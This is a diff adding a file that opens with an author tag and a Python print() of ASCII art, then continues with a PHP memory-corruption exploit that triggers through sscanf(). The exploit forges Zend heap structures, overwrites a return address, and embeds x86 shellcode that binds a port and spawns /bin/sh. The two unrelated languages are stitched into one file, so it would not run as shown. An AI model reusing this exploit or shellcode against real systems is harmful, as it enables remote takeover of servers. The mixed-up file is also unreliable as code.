@@ -1,0 +1,94 @@
+made by:RAZERxV0C
+8/3/26
+
+print("_______0____________________________0
+_______0____________________________0
+_______00__________________________00
+________00_________________________00
+________000_______________________00
+_________000_____________________00
+___0______000_______00__00_____000_______0
+___00_______000____0_0000_0____00_______00
+____00_______000____000000____00_______00
+_____000______000__00000000___00_____000
+_______0000____00_0000000000_00____000
+_________000______0000000000_____0000
+___________0000___0000000000___000
+______________000__00000000__000
+_______________000_00000000_000
+_____________000_000000000000_000
+___________000__00000000000000___000
+________000____0000000000000000_____000
+_____000______00_000000000000_00______000
+___00________00__000000000000__00_______000
+_000_______000___000000000000____00_______000
+00_______000______0000000000______000_______00
+00______000________00000000________000_______00
+_00_____00__________000000__________00_______00
+__00____000___________00____________00______00
+___00____000_______________________00______00
+__________00______________________00
+___________00____________________00
+____________0___________________0")
+
+   /* base_addr for buffer in memory */
+   $base_addr = 0x812a260;
+   $base_addr_fill = 0x16;
+   /* byte 0 = fill up, byte 1 = refcount, byte 2 = is_ref, byte 3 = type */
+   $zval_attr = 0x00000008;
+   /* will be overwritten to execute our shellcode */
+   $ret_loc = 0xbfffb01c;
+   /* just for searching */
+   $pattern = 0xdeadbabe;
+
+   function long2str($addr) {
+      return pack("V", $addr);
+   }
+
+   $data =
+   	  /* fill up memory */
+          str_repeat(long2str($base_addr), $base_addr_fill) . 
+          /* pattern */
+          long2str($pattern) .
+   	  /* current = base_addr */
+	  long2str($base_addr + 0x4) .	
+          /* *current = _zval_struct */
+	  /* _zval_struct */
+	  /* _zvalue_value */
+	  /* _zvalue_value.str.val */
+          long2str($base_addr + 0x10 + 0xc) .
+	  /* _zvalue_value_str.len */
+	  long2str(0x00000001) .
+	  /* _zval_struct.type, _zval_struct.is_ref, _zval_struct.refcount */
+          long2str($zval_attr) .
+	  /* _zend_mem_header */
+	  /* _zend_mem_header.pNext = start of shellcode  */
+          long2str($base_addr + 28) .
+	  /* _zend_mem_header.pLast */
+          long2str($ret_loc) .
+	  /* zend_mem_header.size, zend_mem_header.cached */
+	  long2str(0x000000400) .
+	  /* jump over next six bytes */
+	  "\xeb\x06\x90\x90" .
+	  /* this bytes will be overwritten by efree() */
+	  "\x90\x90\x90\x90" .
+	  /* shell code starts here -
+	   * BigHawk bind() version - just a little update to get rid
+	   * of 0x3f 
+	   */
+	  "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd" .
+	  "\x80\x89\xc7\x52\x66\x68\x4e\x20\x43\x66\x53\x89\xe1\xb0\xef" .
+	  "\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43" .
+	  "\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89" .
+	  "\xc3\xb0\x6f\x2c\x30\x49\xcd\x80\x41\xe2\xf6\x51\x68\x6e\x2f" .
+	  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\xf4" .
+	  "\xf6\xd0\xcd\x80" .
+	  /* fill up memory */
+	  str_repeat(long2str($base_addr), $base_addr_fill);
+
+   /* fill up memory with emalloc() for sscanf() */
+   quotemeta($data);
+
+   /* trigger exploit */
+   sscanf($data, '%1$s', $str);
+?>
